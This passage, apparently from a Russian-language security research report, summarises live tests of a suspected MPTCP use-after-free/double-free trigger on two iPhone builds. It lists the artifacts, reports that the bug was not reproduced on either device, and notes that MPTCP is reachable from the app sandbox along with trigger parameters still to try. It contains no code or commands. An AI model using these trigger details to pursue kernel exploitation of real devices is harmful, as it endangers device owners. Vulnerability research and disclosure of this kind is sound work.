- **Артефакты:** `tools/mptcp_live/live_run_20261127/` (pcap `v4.pcap` sha256 `28b5fbb5…`, `v5_x13.pcap`,
  `live_phone.pcap`, логи сервера, логи устройства, снимки firewall).

### 11.4 Итоговый вердикт

| Устройство | Вердикт |
|---|---|
| iPhone 17 Pro Max 27.2.1 / 24B156 | триггер доставлен и обработан; **UAF/double-free не воспроизведён**; паники нет |
| iPhone 13 26.5.2 / 23F84 | MPTCP-сокет и handshake работали (раздел 9); **триггер по исправленному стенду не доставлен** (fallback) — не воспроизведён, не опровергнут |

Доступность MPTCP из app sandbox без entitlement подтверждена на **обоих** билдах. Для 23F84 остаётся
открытым: провести тот же тест с другого серверного адреса (сброс fallback) — без `DATA_FIN`, с
`data_len=1`, как здесь.
